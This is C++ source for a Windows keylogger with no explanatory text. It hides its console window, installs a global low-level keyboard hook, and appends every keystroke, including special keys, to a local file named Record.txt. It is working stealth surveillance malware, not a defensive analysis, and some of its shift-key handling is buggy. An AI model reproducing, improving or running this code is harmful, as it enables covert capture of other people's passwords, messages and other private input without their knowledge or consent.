#include <windows.h>
#include <Winuser.h>
#include <fstream>
#include <iostream>


using namespace std;

HHOOK hKeyboardHook;

void hide();
DWORD WINAPI JACKAL(LPVOID lpParm);
LRESULT WINAPI Keylogger(int nCode, WPARAM wParam, LPARAM lParam);

int main()
{
	hide();
	JACKAL(NULL);
	return 0;
}

void hide() {
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}

DWORD WINAPI JACKAL(LPVOID lpParm)
{
	HINSTANCE hins;
	hins = GetModuleHandle(NULL);
	hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)Keylogger, hins, 0);

	MSG message;
	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	UnhookWindowsHookEx(hKeyboardHook);
	return 0;
}

LRESULT WINAPI Keylogger(int nCode, WPARAM wParam, LPARAM lParam)
{
	ofstream write("Record.txt", ios::app);
	if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
	{
		KBDLLHOOKSTRUCT hooked_key = *((KBDLLHOOKSTRUCT*)lParam);

		char key = hooked_key.vkCode;
		if ((key > 64) && (key < 91) && !GetAsyncKeyState(0x10)) { // is lower case alpha
			key += 32;
			write << key;
			write.close();
		}
		else if ((key > 64) && (key < 91)) { // is upper case alpha
			write << key;
			write.close();
		}
		else if (key == VK_SHIFT) {
			switch (key) { // else its a special key with shift
			case 49: write << "!"; break;
			case 48: write << ")"; break;
			case 50: write << "@"; break;
			case 51: write << "#"; break;
			case 52: write << "$"; break;
			case 53: write << "%"; break;
			case 54: write << "^"; break;
			case 55: write << "&"; break;
			case 56: write << "*"; break;
			case 57: write << "("; break;
			default: write << key; break;
			}
		}
		else {
			switch (key) { // else its a special key no shift
			case 8: write << "<BackSpace>"; break;
			case VK_ESCAPE: write << "<Esc>"; break;
			case 49: write << "!"; break;
				//case 127: write << "<Del>"; break;
			case 32: write << " "; break;
			case 13: write << "<Enter>\n"; break;
			case VK_DELETE: write << "we used the special delete key"; break;
			default: write << key; break;
			}
		}
		cout << "THE KEY WAS: " << key << endl;
	}
	write.close();
	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}
